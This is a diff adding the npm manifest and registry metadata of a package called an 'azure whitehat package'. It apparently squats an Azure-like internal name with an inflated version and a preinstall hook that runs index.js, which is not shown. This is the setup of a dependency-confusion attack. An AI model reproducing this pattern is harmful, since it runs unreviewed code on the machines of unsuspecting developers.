@@ -1,0 +1,39 @@
+{
+    "name": "@azure-tests/perf-storage-blob-track-1",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "@azure-tests/perf-storage-blob-track-1@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-TfbbOfiZKBbM9wb7ejBN1gvhnWYIw7e1alPvGlTeDhCDEdm8O4d2iOykuTuSiQcnNuU81VVmvvmErodRdaAdJA==",
+        "shasum": "c08ce8450553004d84a5e595cd657df4da86dbcd",
+        "tarball": "https://registry.npmjs.org/@azure-tests/perf-storage-blob-track-1/-/perf-storage-blob-track-1-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3602,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhoSQQCRA9TVsSAnZWagAAdbQP/jGVgzRnWlDrVrncUGH/\njCBcjPJdSssD3cLbaIjF/wXh9cdOBmFJTX7gxT0MXxlRxzIwKgGuLo05VMKC\nyZMOz8bbqHg9jyOiFqwXyxqG3wQ1e8l1AEK3WzcBgSIl8SoEAm9tIhQOihzi\npiuX3OuDuuxfUfqf1GIkFTnlaXhuugIafOS3QzmIAClWm9FcAp61ou3hNGpu\nXSFxOWyxWI6cGUkEaD5vp+rNKKFXYMJApQm1JKVxxlmcjKtTB3B3Wi7WKMza\nZL3nwcMC0QkiAL2kPRzfYfLTlXu0gdpZOwPUJv50XlOpc/N0WH1JKyC3yNYe\nmg+y1v/+SbAvEdcKxqLUybaTFgHgFmW5ygfhCIh28SiJrw1M/Wus8RID2mPN\nODUGHopMmEDVUL21sLsQVQSAhF33t5vsDL24Ic4m4WZIB5X4H4qujTii5bK8\no+d3uHF0bcD9CigxcXFCdhwDKKNeUQYoYlqnMi5KlaDvlklaGzd8OlGjCEty\nTvO4c27WceAMUdTvCLUyD9VG2HtNs0O7QigGu8j4Y02gddWqo9G5mZLzuM4y\nA/eOV+MYMmMZRJfpnlg3ZvDbU43tfGhUpEyT6Zq/HS1Uq0YHLDqft6Qts+Qk\nxbNxGcYOyODFlLAOzCROyaSUaLv2R2LJPfXgRMvCbC3F4ziFoNA6gsfVm1EV\nFeDO\r\n=b3DN\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "azure-tests",
+        "email": "hussam.tes08+3@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "azure-tests",
+            "email": "hussam.tes08+3@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/perf-storage-blob-track-1_99.10.9_1637950479904_0.9050076168053307"
+    },
+    "_hasShrinkwrap": false
+}
